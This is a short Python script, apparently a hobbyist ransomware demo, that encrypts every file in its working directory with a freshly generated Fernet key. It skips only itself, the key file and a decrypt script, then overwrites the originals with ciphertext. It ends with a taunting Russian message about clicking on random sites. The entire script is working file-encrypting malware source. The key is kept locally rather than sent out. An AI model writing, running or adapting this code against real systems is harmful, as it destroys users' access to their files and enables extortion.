import os as o
from cryptography.fernet import Fernet as frn

#About Fernet -> It is a encoding method that helps us to encrypt our stuff up
files = []
FILENAME = 'thekey.key'

for file in o.listdir():
    if file == 'malware_create.py' or file == 'thekey.key' or file == 'decrypt.py':
        continue
    if o.path.isfile(file):
        files.append(file)

print(files)

key = frn.generate_key()


with open(FILENAME , 'wb') as k:
    k.write(key)

for file in files:
    with open(file , 'rb') as fl:
        con = fl.read()
    encr_con = frn(key).encrypt(con)
    with open(file , 'wb') as wl:
        wl.write(encr_con)

print('Товарищ, я же говорил тебе не кликать на случайные капиталистические сайты.')